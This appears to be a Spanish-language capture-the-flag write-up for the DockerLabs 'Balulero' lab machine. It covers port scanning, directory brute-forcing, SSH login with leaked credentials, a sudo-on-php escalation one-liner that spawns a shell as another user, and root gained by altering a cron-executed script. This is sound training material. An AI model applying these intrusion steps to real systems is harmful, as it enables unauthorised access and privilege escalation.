# 💻 Maquina Balulero

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

* **Nombre de la Máquina:** Balulero
* **Sistema Operativo:** Linux
* **Dificultad:** Fácil
* **Plataforma:** [DockerLabs](https://dockerlabs.es/)
* **Dirección IP:** 127.17.0.2



### Escaneo de puertos.

Iniciamos escaneando los 65.535 puertos de la maquina paraver que tenemos abierto

&#x20;`sudo nmap -sS -p- --open -T5 -n -Pn -v 172.17.0.2 -oG allports`

```sh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-01 09:52 -05
Initiating ARP Ping Scan at 09:52
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 09:52, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:52
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 09:52, 0.52s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.85 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

Tenemos el puerto 80 con http y el puerto 22 con ssh haora ya sabiendo esto miramos que versiones estan corriendo para buscar alguna vulnerabilidad de entrada

`nmap -sCV -p22,80 172.17.0.2 -oG Puertos`

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fb:64:7a:a5:1f:d3:f2:73:9c:8d:54:8b:65:67:3b:11 (RSA)
|   256 47:e1:c1:f2:de:f5:80:0e:10:96:04:95:c2:80:8b:76 (ECDSA)
|_  256 b1:c6:a8:5e:40:e0:ef:92:b2:e8:6f:f3:ad:9e:41:5a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mi Landing Page - Ciberseguridad
|_http-server-header: Apache/2.4.41 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
```

Ahora revisamos con firefox haber que encontramos alojada en esta ip y vemos una pagina tipo portafolio, procedemos  a ejecutar `gobuster` para ver si encontramos subdominios

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

`gobuster dir -u http://balulero.dl -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt`

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://balulero.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 276]
/whoami               (Status: 301) [Size: 311] [--> http://balulero.dl/whoami/]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos un subdominio `whoami`  pero no encontramos nada de interés.

<figure><img src="../../.gitbook/assets/image (12).png" alt="" width="302"><figcaption></figcaption></figure>

Por lo que recurrimos a revisar el codigo fuente de la pagina pero no encontramos tampoco nada y despues de revisar un buen rato encontramos en la consola un mensaje bastante interesante.

<figure><img src="../../.gitbook/assets/image (13).png" alt="" width="409"><figcaption></figcaption></figure>

### Explotacion

Ingresamos y obtenemos un usuario y una contraseña y como tenemos el puerto 22 abierto procedemos a ingresar por dicho puerto con estas credenciales

`ssh balu@172.17.0.2`

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

Listo procedemos a listar permisos y encontramos que tenemos permisos con el usuario Chocolate en `/usr/bin/php` por lo que buscamos esto en [GTFOBins](https://gtfobins.github.io/) y vemos que tenemos un binario que nos puede ayudar a escalar al usuario chocolate.

```sh
balu@c6d02e23ffc3:~$ sudo -l
Matching Defaults entries for balu on c6d02e23ffc3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User balu may run the following commands on c6d02e23ffc3:
    (chocolate) NOPASSWD: /usr/bin/php
```

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

```bash
balu@c6d02e23ffc3:~$ CMD="/bin/bash"
balu@c6d02e23ffc3:~$ sudo -u chocolate php -r "system('$CMD');"
chocolate@c6d02e23ffc3:/home/balu$ whoami
chocolate
```

### Chocolate

Una vez somos user chocolate intentamos con `sudo -l` pero esta vez ya nos pide contraseña por lo que no fue posible listamos permisos `SUID` y tampoco había algo interesante.

<figure><img src="../../.gitbook/assets/image (18).png" alt="" width="358"><figcaption></figcaption></figure>

Encontramos un Archivo en l carpeta `/opt` pero al abrirlo no tenia nada interesante por lo que recurrimos ala herramienta [pspy64](https://github.com/DominicBreuker/pspy), procedo a subir el archivo y a correrlo en nuestra maquina victima y vemos que cada 5 segundos se ejecuta el archivo anteriormente encontrado por lo que procedemos a modificarlo e ingresarle un código para que nos eleve privilegios.

<figure><img src="../../.gitbook/assets/image (19).png" alt="" width="563"><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Lo que hicimos fue reemplazar en el archivo un código que le da privilegios de `root` a nuestra `bash` y luego de 5 segundos&#x20;

SOMOS ROOT
